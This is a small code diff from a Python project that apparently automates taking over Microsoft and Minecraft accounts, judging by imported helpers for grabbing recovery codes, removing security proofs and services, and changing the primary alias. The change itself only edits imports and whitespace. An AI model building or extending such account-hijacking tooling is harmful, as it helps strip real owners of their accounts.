@@ -1,9 +1,8 @@
 from views.utils.securing.securityInformation import securityInformation
 from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
 from views.utils.securing.changePrimaryAlias import changePrimaryAlias
-from views.utils.minecraft.getUsernameInfo import getUsernameInfo
+from views.utils.minecraft.getNamechange import getUsernameInfo
 from views.utils.securing.getRecoveryCode import getRecoveryCode
-# from views.utils.securing.getAccountInfo import getAccountInfo
 from views.utils.securing.removeServices import removeServices
 from views.utils.securing.generateEmail import generateEmail
 from views.utils.securing.removeProof import removeProof
@@ -61,7 +60,7 @@ async def secure(msaauth: str):
     if not t:
 
         print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
-
+        
         # accountInfo["email"] = "Microsoft Down"
         # accountInfo["secEmail"] = "Microsoft Down"
         # accountInfo["recoveryCode"] = "Microsoft Down"
